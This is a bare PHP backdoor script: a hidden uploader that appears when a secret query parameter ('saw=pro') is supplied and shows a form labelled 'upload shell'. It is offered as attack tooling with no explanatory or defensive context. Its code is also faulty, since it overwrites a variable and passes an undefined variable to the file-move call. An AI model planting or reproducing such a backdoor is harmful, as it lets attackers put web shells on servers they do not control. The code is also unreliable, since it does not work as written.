<?php

$system = $_GET['saw'];
if($system == 'pro'){
$saw = $_FILES['file']['name'];
$saw= $_FILES['file']['tmp_name'];
echo "<form method='POST' enctype='multipart/form-data'>
<input type='file'name='file' />
<input type='submit' value='upload shell' />
</form>";
move_uploaded_file($conf,$conf);
}
?>
